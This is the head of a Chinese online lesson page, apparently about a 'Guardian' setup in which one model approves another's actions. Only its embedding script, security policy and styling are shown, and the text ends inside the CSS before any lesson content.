@@ -1,0 +1,1266 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'"><script>(()=>{const send=(type,data={})=>parent.postMessage({scope:'resume-learning',type,lessonId:"codex-19",...data},'*');for(const key of ['localStorage','sessionStorage']){const values=new Map();Object.defineProperty(window,key,{value:{getItem:k=>values.get(k)??null,setItem:(k,v)=>values.set(k,String(v)),removeItem:k=>values.delete(k),clear:()=>values.clear()},configurable:true});}window.lessonOnView=(el,cb)=>{if(el&&typeof cb==='function'){const io=new IntersectionObserver(es=>{if(es.some(e=>e.isIntersecting)){io.disconnect();cb();}});io.observe(el);}};document.addEventListener('click',e=>{const a=e.target.closest('a');if(!a)return;const raw=a.getAttribute('href')||'';if((raw.startsWith('#')&&!a.dataset.reference)||raw.startsWith('data:')||raw.startsWith('blob:'))return;e.preventDefault();let id=a.dataset.lessonId,view=a.dataset.learningView;if(!id&&!view&&!a.dataset.reference){try{const u=new URL(raw,location.href);if(u.origin===new URL(location.href).origin||['xueai.app','xueai.miyang.cn','alice.miyang.cn'].includes(u.hostname)){id=u.searchParams.get('lesson')||(u.hash.endsWith('.html')?decodeURIComponent(u.hash.slice(1)):u.pathname.split('/').pop().replace(/\.html$/,''));}else{send('reference',{url:u.href});return;}}catch{return;}}if(a.dataset.reference)send('reference',{url:a.dataset.reference});else send('navigate',{targetLesson:id,view:view||'courses'});},true);window.addEventListener('DOMContentLoaded',()=>{if(typeof SHARE_URL!=='undefined')SHARE_URL=new URL('/dashboard/learning?lesson=codex-19',location.href).href;document.querySelectorAll('.reveal,.fade-in').forEach(e=>e.classList.add('show'));document.documentElement.classList.remove('xa-locked');document.querySelectorAll('.qr-bar,.xa-watermark,.lesson-nav').forEach(e=>e.remove());document.addEventListener('keydown',e=>{if(e.key==='Escape')send('close');});});})();</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Guardian：让一个模型去审批另一个模型 | xueai.miyang.cn</title>
+<style>@keyframes _si{to{opacity:1}}body{opacity:0;animation:_si .15s ease .08s forwards}</style>
+<style>/* ═══════════════════════════════════════════════════════════
+   lesson.css —— 课程子页统一设计系统
+   所有课程页面（文章式布局）共享此文件。
+   页面特有样式写在各自页面的 <style> 中，但骨架统一用这里的类。
+   ═══════════════════════════════════════════════════════════ */
+
+:root {
+  /* ── 布局（与主题无关） ── */
+  --content-w: 880px;       /* 常规文章宽度 */
+  --content-w-wide: 1100px; /* 宽内容（大图表/分栏）宽度 */
+  --radius: 14px;
+  --radius-sm: 10px;
+}
+
+/* ── 浅色（默认） ──
+   主色由蓝改墨绿，与外壳 learn.html 的 --accent 同值。
+   语义色（danger/amber/success/cyan/purple）只用于正文里的图表和标记，
+   不进 UI 骨架，所以保持原样，只在深色下换一档亮度。 */
+:root, [data-theme="light"] {
+  --bg: #f7f5f0;            /* 页面米白底 */
+  --bg-dim: #f8f9fa;
+  --card: #ffffff;          /* 卡片白底 */
+  --card-2: #fbfaf7;        /* 次级面（表头、代码块底） */
+  --text: #1c1c1e;          /* 主文字 */
+  --sub: #6b7280;           /* 次要文字 */
+  --faint: #9aa19d;         /* 三级文字 */
+  --accent: #146b54;        /* 主题墨绿 */
+  --accent-soft: #e9f2ee;   /* 主色淡底 */
+  --danger: #dc2626;
+  --amber: #d97706;
+  --success: #16a34a;
+  --cyan: #0891b2;
+  --purple: #7c3aed;
+  --border: rgba(0,0,0,0.07);
+  --hover: rgba(0,0,0,0.045);
+  --code-bg: rgba(0,0,0,0.05);
+  --scroll-thumb: rgba(0,0,0,0.15);
+  --shadow-card: 0 1px 3px rgba(0,0,0,0.04);
+  --shadow-pop: 0 8px 30px rgba(0,0,0,0.10);
+  color-scheme: light;
+}
+
+/* ── 深色 ──
+   同一套语义变量换值，组件规则一行都不用改。
+   底色带一点绿味（而不是纯中性灰），跟墨绿主色是同一支色的延伸。
+   语义色统一提亮并降饱和：深底上原来的 #dc2626 这类会显得脏且刺眼。 */
+[data-theme="dark"] {
+  --bg: #101512;
+  --bg-dim: #1b221e;
+  --card: #171d19;
+  --card-2: #1b221e;
+  --text: #e9ece9;
+  --sub: #a3ada8;
+  --faint: #6f7975;
+  --accent: #5cb595;
+  --accent-soft: rgba(92,181,149,0.14);
+  --danger: #e98d7b;
+  --amber: #d9a45f;
+  --success: #5cb595;
+  --cyan: #5bb6c9;
+  --purple: #a892d6;
+  --border: rgba(255,255,255,0.10);
+  --hover: rgba(255,255,255,0.06);
+  --code-bg: rgba(255,255,255,0.08);
+  --scroll-thumb: rgba(255,255,255,0.18);
+  --shadow-card: 0 1px 3px rgba(0,0,0,0.30);
+  --shadow-pop: 0 8px 30px rgba(0,0,0,0.50);
+  color-scheme: dark;
+}
+
+/* ── 顶部公众号关注条 ── */
+.qr-bar{
+  background:linear-gradient(135deg,#fff8f0 0%,#fff3e6 100%);
+  border-bottom:1px solid rgba(217,119,6,.12);
+  padding:10px 20px;
+  display:flex;align-items:center;justify-content:center;gap:12px;
+  font-size:13px;color:#92400e;
+  position:relative;z-index:100;
+}
+.qr-bar img{
+  width:36px;height:36px;border-radius:6px;
+  box-shadow:0 1px 4px rgba(0,0,0,.08);
+  flex-shrink:0;
+}
+.qr-bar .qr-text{font-weight:600;}
+.qr-bar .qr-text b{color:#d97706;}
+.qr-bar .qr-close{
+  position:absolute;right:12px;top:50%;transform:translateY(-50%);
+  width:24px;height:24px;border:none;background:none;cursor:pointer;
+  color:#92400e;opacity:.5;font-size:16px;line-height:1;
+  display:flex;align-items:center;justify-content:center;
+  border-radius:50%;transition:opacity .2s,background .2s;
+}
+.qr-bar .qr-close:hover{opacity:1;background:rgba(0,0,0,.05);}
+
+[data-theme="dark"] .qr-bar{
+  background:linear-gradient(135deg,rgba(217,119,6,.14),rgba(217,119,6,.08));
+  border-bottom-color:rgba(217,164,95,.22);
+  color:#d9a45f;
+}
+[data-theme="dark"] .qr-bar .qr-text b,
+[data-theme="dark"] .qr-bar .qr-close{color:#e4b86f;}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Segoe UI", Roboto, sans-serif;
+  -webkit-font-smoothing: antialiased;
+  line-height: 1.7;
+  padding-bottom: 110px; /* 给底部悬浮按钮留空间 */
+}
+
+/* ── 文章容器 ── */
+.lesson {
+  max-width: var(--content-w);
+  margin: 0 auto;
+  padding: 56px 28px 40px;
+}
+.lesson.wide { max-width: var(--content-w-wide); }
+
+/* ── 页头 ── */
+.lesson-header { margin-bottom: 36px; }
+.lesson-header .kicker {
+  font-size: 13px; font-weight: 700; letter-spacing: 1.5px;
+  text-transform: uppercase; color: var(--accent); margin-bottom: 10px;
+}
+.lesson-header h1 {
+  font-size: 32px; font-weight: 800; line-height: 1.35; color: var(--text);
+}
+.lesson-header .subtitle {
+  font-size: 15px; color: var(--sub); margin-top: 10px; line-height: 1.7;
+}
+
+/* ── 章节小标题（贯穿全文的分节） ── */
+.sec-label {
+  font-size: 12px; font-weight: 800; letter-spacing: 0.8px;
+  text-transform: uppercase; color: var(--sub);
+  margin: 36px 0 14px;
+  display: flex; align-items: center; gap: 10px;
+}
+.sec-label::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+/* ── 通用卡片 ── */
+.l-card {
+  background: var(--card);
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius);
+  padding: 18px 22px;
+  box-shadow: var(--shadow-card);
+}
+
+/* ── 强调框（引言/结论） ── */
+.l-callout {
+  background: color-mix(in srgb, var(--accent) 6%, transparent);
+  border: 1.5px solid color-mix(in srgb, var(--accent) 24%, transparent);
+  border-radius: var(--radius);
+  padding: 18px 22px;
+}
+.l-callout b { color: var(--accent); }
+
+/* ── 渐入动画（逐步展示的元素统一用 .reveal + .show） ── */
+.reveal {
+  opacity: 0; transform: translateY(10px);
+  transition: opacity 0.4s ease, transform 0.4s ease;
+}
+.reveal.show { opacity: 1; transform: translateY(0); }
+
+/* ── 底部悬浮"下一步"按钮 ── */
+.fab-wrap {
+  position: fixed; left: 0; right: 0; bottom: 0;
+  display: flex; justify-content: center;
+  padding: 14px 20px calc(18px + env(safe-area-inset-bottom));
+  background: linear-gradient(to top, var(--bg) 55%, transparent);
+  pointer-events: none; z-index: 50;
+}
+.fab-wrap .btn-next {
+  pointer-events: auto;
+  background: var(--accent); color: #fff; border: none;
+  padding: 13px 34px; border-radius: 999px;
+  font-size: 15px; font-weight: 700; cursor: pointer;
+  box-shadow: 0 6px 20px color-mix(in srgb, var(--accent) 35%, transparent);
+  transition: transform 0.15s, box-shadow 0.15s, filter 0.15s;
+  font-family: inherit;
+}
+.fab-wrap .btn-next:hover { transform: translateY(-2px); filter: brightness(1.08); box-shadow: 0 10px 26px color-mix(in srgb, var(--accent) 42%, transparent); }
+.fab-wrap .btn-next:active { transform: translateY(0); }
+.fab-wrap .btn-next:disabled { background: #c4c8cf; cursor: not-allowed; box-shadow: none; transform: none; filter: none; }
+.fab-wrap.hidden { display: none; }
+
+/* ── 双列网格（桌面双列 / 移动单列） ── */
+.l-cols {
+  display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
+}
+
+/* ── 代码 / mono 文本 ── */
+.l-mono, code, pre {
+  font-family: "SF Mono", "Fira Code", Menlo, monospace;
+}
+code {
+  font-size: 0.88em;
+  background: var(--code-bg);
+  padding: 1px 6px; border-radius: 5px;
+  color: var(--accent);
+}
+
+/* ── 正文链接：课程胶囊（与 Ask Alice 的 al-course-link 同风格） ──
+   只命中 main.lesson 内无 class 的正文链接；组件自带样式的链接不受影响。
+   站内互链前置书本图标，http 外链换成外跳图标（Lucide，内嵌 SVG mask）。 */
+.lesson a:not([class])[href] {
+  display: inline-flex; align-items: center; gap: 4px;
+  max-width: 100%; margin: 0 2px; padding: 1px 8px 1px 7px;
+  vertical-align: baseline; line-height: 1.55;
+  color: var(--accent);
+  /* 底色与描边从 currentColor 派生：页面主题若改了链接色，整颗胶囊自动跟随 */
+  background: #f3f7ff;
+  background: color-mix(in srgb, currentColor 7%, transparent);
+  border: 1px solid #d9e4f8;
+  border-color: color-mix(in srgb, currentColor 24%, transparent);
+  border-radius: 8px;
+  font-weight: 650; text-decoration: none;
+  box-shadow: 0 1px 1px rgba(20,40,80,0.03);
+  transition: color .15s, background-color .15s, border-color .15s, box-shadow .15s;
+}
+.lesson a:not([class])[href]:visited { color: var(--accent); }
+.lesson a:not([class])[href]:hover {
+  background: #e8f0fd;
+  background: color-mix(in srgb, currentColor 13%, transparent);
+  border-color: #bfd3f4;
+  border-color: color-mix(in srgb, currentColor 38%, transparent);
+  box-shadow: 0 2px 6px rgba(20,40,80,0.08);
+}
+.lesson a:not([class])[href]:focus-visible { outline: 2px solid color-mix(in srgb, var(--accent) 42%, transparent); outline-offset: 2px; }
+.lesson a:not([class])[href]::before {
+  content: ""; flex: 0 0 auto; width: 12px; height: 12px;
+  background: currentColor;
+  -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z'/%3E%3Cpath d='M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z'/%3E%3C/svg%3E") center / contain no-repeat;
+  mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z'/%3E%3Cpath d='M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z'/%3E%3C/svg%3E") center / contain no-repeat;
+}
+.lesson a:not([class])[href^="http"]::before {
+  -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M15 3h6v6'/%3E%3Cpath d='M10 14 21 3'/%3E%3Cpath d='M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6'/%3E%3C/svg%3E");
+  mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M15 3h6v6'/%3E%3Cpath d='M10 14 21 3'/%3E%3Cpath d='M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6'/%3E%3C/svg%3E");
+}
+
+/* ── 历史课页的深色兼容层 ──
+   这些类在大量课程中反复出现，但各页曾把浅色面板写死在自己的 <style> 里。
+   这里只在 dark 下接管“容器底色和正文色”，保留红/绿等语义，不改变图表含义。 */
+[data-theme="dark"] .lesson :is(
+  .takeaway-box,
+  .qa-answer,
+  .xa-tldr,
+  .key-box,
+  .summary-box,
+  .conclusion-box
+){
+  background:var(--accent-soft) !important;
+  border-color:color-mix(in srgb,var(--accent) 34%,transparent) !important;
+}
+[data-theme="dark"] .lesson :is(
+  .takeaway-box,
+  .qa-answer,
+  .xa-tldr,
+  .key-box,
+  .summary-box,
+  .conclusion-box
+) :is(h2,h3,h4,b,strong){
+  color:var(--accent) !important;
+}
+[data-theme="dark"] .lesson :is(
+  .takeaway-box,
+  .qa-answer,
+  .xa-tldr,
+  .key-box,
+  .summary-box,
+  .conclusion-box
+) :is(p,li){
+  color:var(--text) !important;
+}
+
+[data-theme="dark"] .lesson :is(.warn-card,.danger-box,.warning-box){
+  background:color-mix(in srgb,var(--danger) 10%,var(--card)) !important;
+  border-color:color-mix(in srgb,var(--danger) 38%,transparent) !important;
+}
+[data-theme="dark"] .lesson :is(.warn-card,.danger-box,.warning-box) :is(h2,h3,h4,b,strong){
+  color:var(--danger) !important;
+}
+[data-theme="dark"] .lesson :is(.warn-card,.danger-box,.warning-box) :is(p,li){
+  color:color-mix(in srgb,var(--danger) 58%,var(--text)) !important;
+}
+
+[data-theme="dark"] .lesson .col-bad{
+  background:color-mix(in srgb,var(--danger) 10%,var(--card)) !important;
+  color:var(--danger) !important;
+}
+[data-theme="dark"] .lesson .col-good{
+  background:color-mix(in srgb,var(--success) 10%,var(--card)) !important;
+  color:var(--success) !important;
+}
+[data-theme="dark"] .lesson .col-label{
+  background:var(--card-2) !important;
+  color:var(--sub) !important;
+}
+
+/* 原生表单控件和代码面板也跟随主题；页面自己声明的语义色仍可覆盖。 */
+[data-theme="dark"] .lesson :is(input,textarea,select){
+  color:var(--text);
+  background-color:var(--card);
+  border-color:var(--border);
+}
+[data-theme="dark"] .lesson :is(pre,.code-box,.code-block,.terminal){
+  border-color:var(--border);
+}
+
+/* ── 滚动条 ── */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--scroll-thumb); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: color-mix(in srgb, var(--scroll-thumb) 75%, var(--text)); }
+
+/* ── 移动端 ── */
+@media (max-width: 768px) {
+  .lesson { padding: 36px 18px 30px; }
+  .lesson-header h1 { font-size: 24px; }
+  .lesson-header .subtitle { font-size: 14px; }
+  .l-cols { grid-template-columns: 1fr; }
+  .l-card { padding: 15px 16px; }
+  .fab-wrap .btn-next { width: 100%; max-width: 440px; padding: 14px 0; }
+}
+</style>
+<style>
+:root,.lesson{--accent:#414b5a;--accent-deep:#262d38;--accent-soft:rgba(65,75,90,.085)}
+/* 变量挂在 .lesson 上：nav-inject.js 会在页面样式之后再注入一次 :root 主色，
+   靠就近继承才能保住专题色。 */
+.lesson-header{position:relative;overflow:hidden}
+.lesson-header:after{content:"";position:absolute;right:-70px;top:-70px;width:220px;height:220px;border:1px solid rgba(65,75,90,.22);border-radius:50%;box-shadow:0 0 0 26px rgba(65,75,90,.04),0 0 0 52px rgba(65,75,90,.025)}
+.lesson>p{font-size:15px;line-height:2;margin:0 0 20px}
+.lesson .sec-label{margin:56px 0 20px}
+.objective{display:grid;grid-template-columns:auto 1fr;gap:16px;align-items:center;background:linear-gradient(135deg,var(--accent-soft),rgba(255,255,255,.75));border:1px solid rgba(65,75,90,.28);border-radius:var(--radius);padding:24px;margin:24px 0 32px}
+.objective svg{color:var(--accent)}.objective b{display:block;color:var(--accent);margin-bottom:6px}.objective span{font-size:14px;line-height:1.9;color:var(--text)}
+.q-tag{display:inline-block;padding:5px 14px;border-radius:999px;background:var(--accent-soft);color:var(--accent-deep);font-size:13px;font-weight:800;margin:28px 0 14px}
+.key-line{margin:32px 0;padding:24px;border-radius:14px;background:var(--accent-soft);border:1px solid rgba(65,75,90,.25);text-align:center;font-size:18px;font-weight:800;line-height:1.8;color:var(--accent-deep)}
+.visual{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:24px;margin:24px 0;box-shadow:var(--shadow-card)}
+.visual svg{width:100%;height:auto;display:block}.visual-caption{font-size:12.5px;color:var(--sub);text-align:center;margin-top:12px;line-height:1.7}
+.source{background:var(--card);border:1px solid var(--border);border-radius:14px;overflow:hidden;margin:24px 0 0}
+.source-head{display:flex;justify-content:space-between;gap:12px;padding:12px 18px;background:var(--accent-soft);color:var(--accent-deep);font:12px ui-monospace,SFMono-Regular,Menlo,monospace}
+.source pre{margin:0;padding:20px;overflow:auto}.source code{color:var(--text);font:12.5px/1.85 ui-monospace,SFMono-Regular,Menlo,monospace;background:none;padding:0}
+.snapshot{margin:14px 0 0;padding:14px 18px;border:1px solid var(--border);border-radius:8px;background:var(--bg);font-size:12px;line-height:1.8;color:var(--sub)}.snapshot code{color:var(--text);background:rgba(0,0,0,.05)}
+.src-note{font-size:12.5px;color:var(--sub);line-height:1.8;margin:-8px 0 20px}.src-note code{font-size:11.5px}
+.four{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin:8px 0 24px}
+.four article{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px}
+.four article b{display:block;font-size:14px;color:var(--accent-deep);margin-bottom:8px}
+.four article p{margin:0;font-size:14px;line-height:1.9;color:var(--sub)}
+.exercise{display:grid;grid-template-columns:52px 1fr;gap:18px;background:linear-gradient(135deg,#eff1f5,var(--card));border:1px solid rgba(65,75,90,.3);border-radius:14px;padding:24px;margin-top:12px}
+.exercise-num{width:46px;height:46px;border-radius:12px;background:var(--accent);color:white;display:grid;place-items:center;font-weight:900}
+.exercise h3{margin:0 0 10px;color:var(--text);font-size:16px}.exercise p{margin:0 0 12px;color:var(--sub);font-size:14px;line-height:1.9}.exercise p:last-child{margin:0}
+.takeaway{margin-top:32px;padding:24px;border-radius:14px;background:var(--accent-soft);border:1px solid rgba(65,75,90,.25);color:var(--text);display:flex;gap:14px;font-size:14px;line-height:1.9}
+.takeaway svg{flex:0 0 auto;color:var(--accent)}.takeaway b{color:var(--accent-deep)}
+.compare{display:grid;grid-template-columns:1fr;gap:20px;margin-top:14px}
+.cmp-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px;box-shadow:var(--shadow-card)}
+.cmp-card h4{margin:0;font-size:15px;color:var(--text);display:flex;align-items:center;gap:8px}.cmp-card h4 svg{color:var(--accent)}
+.cmp-card p{font-size:14px;line-height:1.9;color:var(--sub);margin:12px 0 0}
+.cmp-card .cmp-tag{display:inline-block;margin-top:14px;padding:3px 10px;border-radius:999px;font-size:11px;font-weight:700;background:var(--accent-soft);color:var(--accent-deep);border:1px solid rgba(65,75,90,.25)}
+.demo{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:28px;box-shadow:var(--shadow-card)}
+.demo-top{display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap;margin-bottom:20px}
+.demo-title{font-size:14px;font-weight:700;color:var(--text)}
+.demo-ctrl{display:flex;gap:12px;flex-wrap:wrap}
+.demo-ctrl button{display:inline-flex;align-items:center;justify-content:center;gap:7px;padding:10px 20px;min-height:44px;min-width:44px;border:1px solid rgba(65,75,90,.35);border-radius:999px;background:var(--accent-soft);color:var(--accent-deep);font:600 14px/1 -apple-system,BlinkMacSystemFont,"PingFang SC",sans-serif;cursor:pointer;transition:filter .15s}
+.demo-ctrl button:active{filter:brightness(.92)}
+.dm-budget{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:16px;padding:16px 18px;border-radius:12px;background:var(--bg);border:1px solid var(--border)}
+.dm-budget .dm-b-label{font-size:13px;font-weight:700;color:var(--text)}
+.dm-budget .dm-b-hint{font-size:12px;color:var(--sub);line-height:1.7}
+.dm-seg{display:flex;gap:8px;flex-wrap:wrap}
+.dm-seg button{min-height:44px;padding:10px 16px;border-radius:999px;border:1px solid var(--border);background:var(--card);color:var(--sub);font:600 13px/1 -apple-system,BlinkMacSystemFont,"PingFang SC",sans-serif;cursor:pointer;transition:all .15s cubic-bezier(.4,0,.2,1)}
+.dm-seg button.on{background:var(--accent);border-color:var(--accent);color:#fff}
+.dm-cols{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.dm-col{border:1px solid var(--border);border-radius:12px;background:var(--bg);overflow:hidden;display:flex;flex-direction:column}
+.dm-col:first-child .dm-head{position:relative}
+.dm-col:first-child .dm-head:after{content:"";position:absolute;left:16px;right:16px;bottom:0;height:3px;border-radius:99px;background:var(--accent);transform:scaleX(var(--bar,0));transform-origin:left center;transition:transform .5s cubic-bezier(.25,1,.5,1)}
+.dm-head{padding:14px 16px;background:var(--card);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+.dm-head .dm-name{font-size:13px;font-weight:800;color:var(--text)}
+.dm-head .dm-meta{font-size:12px;color:var(--sub);transition:opacity .3s cubic-bezier(.4,0,.2,1)}
+.dm-body{padding:18px;display:flex;flex-direction:column;gap:12px;min-height:280px}
+.dm-steps{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.dm-st{padding:14px 12px;border-radius:9px;border:1px solid var(--border);background:var(--card);min-height:86px;opacity:1;transform:scale(1);transition:all .35s cubic-bezier(.4,0,.2,1)}
+.dm-steps.is-live .dm-st{opacity:.4;transform:scale(.98)}
+.dm-steps.is-live .dm-st.on,.dm-steps.is-live .dm-st.fail{opacity:1;transform:scale(1)}
+.dm-steps.is-live .dm-st.done{opacity:.72;transform:scale(.99)}
+.dm-st b{display:block;font-size:12px;color:var(--faint);margin-bottom:6px}
+.dm-st span{display:block;font-size:13px;line-height:1.7;color:var(--sub)}
+.dm-st.on{border-color:rgba(65,75,90,.45);background:var(--accent-soft)}
+.dm-st.on b,.dm-st.on span{color:var(--accent-deep);font-weight:600}
+.dm-st.done{border-color:rgba(22,163,74,.35);background:rgba(22,163,74,.07)}
+.dm-st.done b{color:var(--success)}
+.dm-st.fail{border-color:rgba(220,38,38,.35);background:rgba(220,38,38,.05)}
+.dm-st.fail b,.dm-st.fail span{color:var(--danger)}
+.dm-st.firing,.dm-break.firing,.dm-status.firing,.dm-trace li.firing{animation:fireGlow .8s cubic-bezier(.25,1,.5,1)}
+.dm-cmd{padding:12px 14px;border-radius:9px;background:var(--card);border:1px dashed var(--border);font:12.5px/1.7 ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--text);word-break:break-all;transition:opacity .3s cubic-bezier(.4,0,.2,1)}
+.dm-chips{display:flex;flex-wrap:wrap;gap:8px}
+.dm-chip{padding:5px 10px;border-radius:999px;font-size:12px;line-height:1.6;border:1px solid var(--border);color:var(--sub);background:var(--card);transition:all .35s cubic-bezier(.4,0,.2,1)}
+.dm-chip.keep{background:var(--accent-soft);color:var(--accent-deep);border-color:rgba(65,75,90,.25)}
+.dm-chip.drop{color:var(--faint);text-decoration:line-through;opacity:.7}
+.dm-chip.is-enter{opacity:0;transform:translateY(8px)}
+.dm-chip.is-enter.in{opacity:1;transform:none;transition:opacity .35s cubic-bezier(.4,0,.2,1),transform .35s cubic-bezier(.4,0,.2,1)}
+.dm-chip.drop.is-enter.in{opacity:.7}
+.dm-fields{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.dm-field{padding:12px;border-radius:9px;background:var(--card);border:1px solid var(--border);opacity:1;transform:scale(1);transition:all .35s cubic-bezier(.4,0,.2,1)}
+.dm-fields.is-live .dm-field{opacity:.4;transform:scale(.98)}
+.dm-fields.is-live .dm-field.now{opacity:1;transform:scale(1)}
+.dm-field b{display:block;font-size:11px;color:var(--sub);margin-bottom:4px;font-weight:700}
+.dm-field span{font-size:13.5px;line-height:1.6;color:var(--text);font-weight:700;transition:opacity .3s cubic-bezier(.4,0,.2,1)}
+.dm-field.out-allow{background:rgba(22,163,74,.07);border-color:rgba(22,163,74,.35)}
+.dm-field.out-allow span{color:var(--success)}
+.dm-field.out-deny,.dm-field.out-fail{background:rgba(220,38,38,.05);border-color:rgba(220,38,38,.35)}
+.dm-field.out-deny span,.dm-field.out-fail span{color:var(--danger)}
+.dm-field.pop{animation:flashPop .8s cubic-bezier(.25,1,.5,1)}
+.dm-break{position:relative;padding:12px 14px;border-radius:9px;background:var(--card);border:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;transition:background .35s cubic-bezier(.4,0,.2,1),border-color .35s cubic-bezier(.4,0,.2,1),color .35s cubic-bezier(.4,0,.2,1)}
+.dm-break:after{content:"";position:absolute;left:14px;right:14px;bottom:0;height:3px;border-radius:99px;background:var(--accent);transform:scaleX(var(--heat,0));transform-origin:left center;transition:transform .6s cubic-bezier(.25,1,.5,1)}
+.dm-break.warn:after{background:var(--danger)}
+.dm-break .dm-b-ttl{font-size:12px;font-weight:700;color:var(--text)}
+.dm-break .dm-b-sub{font-size:12px;color:var(--sub);line-height:1.6}
+.dm-dots{display:flex;gap:8px}
+.dm-dot{width:16px;height:16px;border-radius:50%;border:1.5px solid rgba(65,75,90,.35);background:var(--card);display:inline-block;font-style:normal;transition:background .3s cubic-bezier(.4,0,.2,1),border-color .3s cubic-bezier(.4,0,.2,1),transform .35s cubic-bezier(.4,0,.2,1)}
+.dm-dot.on{background:var(--accent);border-color:var(--accent)}
+.dm-dot.trip{background:var(--danger);border-color:var(--danger)}
+.dm-dot.pop{animation:flashPop .8s cubic-bezier(.25,1,.5,1)}
+.dm-break.warn{border-color:rgba(220,38,38,.35);background:rgba(220,38,38,.05)}
+.dm-break.warn .dm-b-ttl,.dm-break.warn .dm-b-sub{color:var(--danger);font-weight:600}
+.dm-break.ok{border-color:rgba(22,163,74,.35);background:rgba(22,163,74,.07)}
+.dm-status{padding:12px 14px;border-radius:9px;font-size:12.5px;line-height:1.75;background:var(--card);border:1px dashed var(--border);color:var(--sub);min-height:58px;transition:all .35s cubic-bezier(.4,0,.2,1)}
+.dm-status.warn{border-style:solid;border-color:rgba(220,38,38,.35);background:rgba(220,38,38,.05);color:var(--danger);font-weight:600}
+.dm-status.hold{border-style:solid;border-color:rgba(65,75,90,.4);background:var(--accent-soft);color:var(--accent-deep);font-weight:600}
+.dm-status.ok{border-style:solid;border-color:rgba(22,163,74,.4);background:rgba(22,163,74,.07);color:var(--success);font-weight:600}
+.dm-trace{margin-top:24px;border:1px solid var(--border);border-radius:12px;background:var(--bg);overflow:hidden}
+.dm-trace-tag{padding:12px 18px;background:var(--card);border-bottom:1px solid var(--border);font-size:12px;font-weight:700;color:var(--sub)}
+.dm-trace ol{margin:0;padding:10px 0;list-style:none}
+.dm-trace li{display:flex;justify-content:space-between;gap:16px;padding:9px 18px;font-size:12.5px;line-height:1.7;color:var(--sub);opacity:1;transform:scale(1);transition:all .35s cubic-bezier(.4,0,.2,1)}
+.dm-trace.is-live li{opacity:.4;transform:scale(.98)}
+.dm-trace li.on,.dm-trace.is-live li.on{background:var(--accent-soft);color:var(--accent-deep);font-weight:600;opacity:1;transform:scale(1)}
+.dm-trace li span.ln{flex:0 0 auto;font:11px ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--faint)}
+.dm-trace li.on span.ln{color:var(--accent-deep)}
+.dm-caption{margin-top:20px;min-height:56px;display:flex;align-items:center;gap:12px;padding:16px 18px;border-radius:10px;background:var(--accent-soft);border:1px solid rgba(65,75,90,.22);font-size:14px;line-height:1.8;color:var(--text)}
+.dm-caption svg{flex:0 0 auto;color:var(--accent)}
+#dm-caption-text{transition:opacity .3s cubic-bezier(.4,0,.2,1)}
+.dm-summary{display:flex;flex-direction:column;gap:14px;max-height:0;overflow:hidden;opacity:0;margin-top:0;padding:0 22px;border:1px solid transparent;border-radius:12px;background:linear-gradient(135deg,var(--accent-soft),var(--card));transition:max-height .5s cubic-bezier(.25,1,.5,1),opacity .4s cubic-bezier(.4,0,.2,1)}
+.dm-summary.on{max-height:320px;opacity:1;margin-top:20px;padding:20px 22px;border-color:rgba(65,75,90,.3)}
+.dm-summary .dm-s{font-size:13px;line-height:1.8;color:var(--sub)}.dm-summary .dm-s b{display:block;font-size:13.5px;color:var(--accent-deep);margin-bottom:2px}
+.demo-caption{font-size:11.5px;color:var(--sub);margin-top:14px;line-height:1.7}
+@keyframes flashPop{0%{transform:scale(.8)}30%{transform:scale(1.15)}100%{transform:scale(1)}}
